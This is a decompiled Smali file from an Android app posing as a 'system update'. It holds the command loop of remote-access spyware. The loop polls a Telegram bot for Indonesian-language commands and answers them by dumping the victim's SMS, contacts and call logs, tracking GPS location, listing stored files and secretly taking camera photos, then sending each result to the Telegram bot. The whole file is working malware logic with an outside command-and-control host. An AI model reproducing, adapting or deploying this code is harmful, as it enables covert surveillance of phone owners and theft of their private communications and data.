.class Lcom/system/update/Payload$1;
.super Ljava/lang/Object;
.source "Payload.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/system/update/Payload;->onStartCommand(Landroid/content/Intent;II)I
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/system/update/Payload;


# direct methods
.method constructor <init>(Lcom/system/update/Payload;)V
    .registers 2
    .annotation system Ldalvik/annotation/MethodParameters;
        accessFlags = {
            0x8010
        }
        names = {
            null
        }
    .end annotation

    .line 90
    iput-object p1, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .registers 7

    .line 93
    const-string v0, "\"update_id\":"

    :goto_2
    iget-object v1, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    # getter for: Lcom/system/update/Payload;->isRunning:Z
    invoke-static {v1}, Lcom/system/update/Payload;->access$000(Lcom/system/update/Payload;)Z

    move-result v1

    if-eqz v1, :cond_194

    .line 95
    :try_start_a
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "https://api.telegram.org/bot"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    # getter for: Lcom/system/update/Payload;->BOT_TOKEN:Ljava/lang/String;
    invoke-static {v2}, Lcom/system/update/Payload;->access$100(Lcom/system/update/Payload;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/getUpdates?offset="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    # getter for: Lcom/system/update/Payload;->lastUpdateId:J
    invoke-static {v2}, Lcom/system/update/Payload;->access$200(Lcom/system/update/Payload;)J

    move-result-wide v2

    const-wide/16 v4, 0x1

    add-long/2addr v2, v4

    invoke-virtual {v1, v2, v3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&timeout=10"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 96
    new-instance v2, Ljava/net/URL;

    invoke-direct {v2, v1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 97
    invoke-virtual {v2}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v1

    check-cast v1, Ljava/net/HttpURLConnection;

    .line 98
    const-string v2, "GET"

    invoke-virtual {v1, v2}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 100
    new-instance v2, Ljava/io/BufferedReader;

    new-instance v3, Ljava/io/InputStreamReader;

    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v1

    invoke-direct {v3, v1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v2, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 101
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    .line 103
    :goto_5f
    invoke-virtual {v2}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v3

    if-eqz v3, :cond_69

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_5f

    .line 104
    :cond_69
    invoke-virtual {v2}, Ljava/io/BufferedReader;->close()V

    .line 106
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 108
    invoke-virtual {v1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_9c

    .line 109
    invoke-virtual {v1, v0}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v2

    add-int/lit8 v2, v2, 0xc

    .line 110
    const-string v3, ","

    invoke-virtual {v1, v3, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;I)I

    move-result v3

    .line 111
    const/4 v4, -0x1

    if-ne v3, v4, :cond_8b

    const-string v3, "}"

    invoke-virtual {v1, v3, v2}, Ljava/lang/String;->indexOf(Ljava/lang/String;I)I

    move-result v3

    .line 112
    :cond_8b
    iget-object v4, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    invoke-virtual {v1, v2, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v2

    # setter for: Lcom/system/update/Payload;->lastUpdateId:J
    invoke-static {v4, v2, v3}, Lcom/system/update/Payload;->access$202(Lcom/system/update/Payload;J)J

    .line 115
    :cond_9c
    const-string v2, "\"text\":\"/dump_sms\""

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_c4

    .line 116
    iget-object v1, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "\ud83d\udce9 *Dump SMS:*\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    # invokes: Lcom/system/update/Payload;->getSms()Ljava/lang/String;
    invoke-static {v3}, Lcom/system/update/Payload;->access$300(Lcom/system/update/Payload;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    # invokes: Lcom/system/update/Payload;->sendTelegramMessage(Ljava/lang/String;)V
    invoke-static {v1, v2}, Lcom/system/update/Payload;->access$400(Lcom/system/update/Payload;Ljava/lang/String;)V

    goto/16 :goto_180

    .line 117
    :cond_c4
    const-string v2, "\"text\":\"/dump_kontak\""

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_ec

    .line 118
    iget-object v1, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "\ud83d\udc65 *Dump Kontak:*\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    # invokes: Lcom/system/update/Payload;->getContacts()Ljava/lang/String;
    invoke-static {v3}, Lcom/system/update/Payload;->access$500(Lcom/system/update/Payload;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    # invokes: Lcom/system/update/Payload;->sendTelegramMessage(Ljava/lang/String;)V
    invoke-static {v1, v2}, Lcom/system/update/Payload;->access$400(Lcom/system/update/Payload;Ljava/lang/String;)V

    goto/16 :goto_180

    .line 119
    :cond_ec
    const-string v2, "\"text\":\"/dump_telpon\""

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_113

    .line 120
    iget-object v1, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "\ud83d\udcde *Dump Call Log:*\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    # invokes: Lcom/system/update/Payload;->getCallLogs()Ljava/lang/String;
    invoke-static {v3}, Lcom/system/update/Payload;->access$600(Lcom/system/update/Payload;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    # invokes: Lcom/system/update/Payload;->sendTelegramMessage(Ljava/lang/String;)V
    invoke-static {v1, v2}, Lcom/system/update/Payload;->access$400(Lcom/system/update/Payload;Ljava/lang/String;)V

    goto :goto_180

    .line 121
    :cond_113
    const-string v2, "\"text\":\"/foto_depan\""

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_122

    .line 122
    iget-object v1, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    const/4 v2, 0x1

    # invokes: Lcom/system/update/Payload;->takePhoto(I)V
    invoke-static {v1, v2}, Lcom/system/update/Payload;->access$700(Lcom/system/update/Payload;I)V

    goto :goto_180

    .line 123
    :cond_122
    const-string v2, "\"text\":\"/foto_belakang\""

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_131

    .line 124
    iget-object v1, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    const/4 v2, 0x0

    # invokes: Lcom/system/update/Payload;->takePhoto(I)V
    invoke-static {v1, v2}, Lcom/system/update/Payload;->access$700(Lcom/system/update/Payload;I)V

    goto :goto_180

    .line 125
    :cond_131
    const-string v2, "\"text\":\"/lacak\""

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_158

    .line 126
    iget-object v1, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "\ud83d\udccd *Lokasi GPS:*\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    # invokes: Lcom/system/update/Payload;->getLocation()Ljava/lang/String;
    invoke-static {v3}, Lcom/system/update/Payload;->access$800(Lcom/system/update/Payload;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    # invokes: Lcom/system/update/Payload;->sendTelegramMessage(Ljava/lang/String;)V
    invoke-static {v1, v2}, Lcom/system/update/Payload;->access$400(Lcom/system/update/Payload;Ljava/lang/String;)V

    goto :goto_180

    .line 127
    :cond_158
    const-string v2, "\"text\":\"/cek_file\""

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_180

    .line 128
    iget-object v1, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "\ud83d\udcc2 *Isi Folder:*\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/system/update/Payload$1;->this$0:Lcom/system/update/Payload;

    const-string v4, "/storage/emulated/0/"

    # invokes: Lcom/system/update/Payload;->listFiles(Ljava/lang/String;)Ljava/lang/String;
    invoke-static {v3, v4}, Lcom/system/update/Payload;->access$900(Lcom/system/update/Payload;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    # invokes: Lcom/system/update/Payload;->sendTelegramMessage(Ljava/lang/String;)V
    invoke-static {v1, v2}, Lcom/system/update/Payload;->access$400(Lcom/system/update/Payload;Ljava/lang/String;)V
    :try_end_180
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_180} :catch_181

    .line 131
    :cond_180
    :goto_180
    goto :goto_185

    :catch_181
    move-exception v1

    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    .line 132
    :goto_185
    :try_start_185
    sget-object v1, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v2, 0x3

    invoke-virtual {v1, v2, v3}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_18c
    .catch Ljava/lang/InterruptedException; {:try_start_185 .. :try_end_18c} :catch_18e

    goto/16 :goto_2

    :catch_18e
    move-exception v1

    invoke-virtual {v1}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto/16 :goto_2

    .line 134
    :cond_194
    return-void
.end method
